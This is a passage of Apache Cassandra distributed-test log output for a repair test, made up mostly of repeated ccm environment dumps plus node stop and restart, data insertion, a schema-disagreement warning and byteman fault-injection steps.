'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-xif8cz3c/test/node3/conf', 'CASSANDRA_LIBJEMALLOC': '-', 'JVM_EXTRA_OPTS': ' -Djdk.attach.allowAttachSelf=true -Dcassandra.migration_task_wait_in_seconds=6 -Dcassandra.migration_task_wait_in_seconds=6 -Dcassandra.migration_task_wait_in_seconds=6'}
02:33:13 00:33:13,637 ccm INFO node3: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': 'b5a2d8d3c06d', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-xif8cz3c/test/node3/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-xif8cz3c/test/node3/conf', 'CASSANDRA_LIBJEMALLOC': '-', 'JVM_EXTRA_OPTS': ' -Djdk.attach.allowAttachSelf=true -Dcassandra.migration_task_wait_in_seconds=6 -Dcassandra.migration_task_wait_in_seconds=6 -Dcassandra.migration_task_wait_in_seconds=6'}
02:33:13 00:33:13,638 ccm INFO node3: using Java 8 for the current invocation
02:33:13 00:33:13,638 ccm INFO node3: using Java 8 for the current invocation
02:33:13 00:33:13,735 ccm INFO Starting node3 with JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64 java_version=8 cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra
02:33:13 00:33:13,735 ccm INFO Starting node3 with JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64 java_version=8 cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra
02:33:13 00:33:35,407 repair_tests.repair_test DEBUG stopping node3
02:33:35 00:33:49,506 cassandra.cluster INFO New Cassandra host <Host: 127.0.0.3:9042 datacenter1> discovered
02:33:49 00:33:49,507 cassandra.cluster INFO New Cassandra host <Host: 127.0.0.2:9042 datacenter1> discovered
02:33:50 00:33:49,584 repair_tests.repair_test DEBUG inserting data while node3 is down
02:33:50 00:34:01,415 repair_tests.repair_test DEBUG bring back node3
02:34:01 00:34:01,594 ccm INFO node3: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': 'b5a2d8d3c06d', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-xif8cz3c/test/node3/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-xif8cz3c/test/node3/conf'}
02:34:01 00:34:01,594 ccm INFO node3: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': 'b5a2d8d3c06d', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-xif8cz3c/test/node3/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-xif8cz3c/test/node3/conf'}
02:34:01 00:34:01,595 ccm INFO node3: using Java 8 for the current invocation
02:34:01 00:34:01,595 ccm INFO node3: using Java 8 for the current invocation
02:34:01 00:34:01,745 ccm INFO node3: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': 'b5a2d8d3c06d', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-xif8cz3c/test/node3/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-xif8cz3c/test/node3/conf', 'CASSANDRA_LIBJEMALLOC': '-', 'JVM_EXTRA_OPTS': ' -Dcassandra.migration_task_wait_in_seconds=6'}
02:34:01 00:34:01,745 ccm INFO node3: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': 'b5a2d8d3c06d', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-xif8cz3c/test/node3/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-xif8cz3c/test/node3/conf', 'CASSANDRA_LIBJEMALLOC': '-', 'JVM_EXTRA_OPTS': ' -Dcassandra.migration_task_wait_in_seconds=6'}
02:34:01 00:34:01,746 ccm INFO node3: using Java 8 for the current invocation
02:34:01 00:34:01,746 ccm INFO node3: using Java 8 for the current invocation
02:34:01 00:34:01,818 ccm INFO Starting node3 with JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64 java_version=8 cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra
02:34:01 00:34:01,818 ccm INFO Starting node3 with JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64 java_version=8 cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra
02:34:01 00:34:03,693 cassandra.cluster WARNING Node 127.0.0.1:9042 is reporting a schema disagreement: {UUID('811b6b1a-26f2-311c-976b-f0106edbfca9'): [<DefaultEndPoint: 127.0.0.1:9042>, <DefaultEndPoint: 127.0.0.2:9042>], UUID('2207c2a9-f598-3971-986b-2926e09e239d'): [<DefaultEndPoint: 127.0.0.3:9042>]}
02:34:03 00:34:17,349 repair_tests.repair_test DEBUG Submitting byteman script to node2
02:34:17 install rule sleep 60s on stream session
02:34:17 
02:34:17 00:34:17,492 repair_tests.repair_test DEBUG repair node1
02:34:17 00:34:17,492 repair_tests.repair_test DEBUG Will kill node2 in middle of sync
02:34:17 00:34:17,630 ccm INFO node1: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': 'b5a2d8d3c06d', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01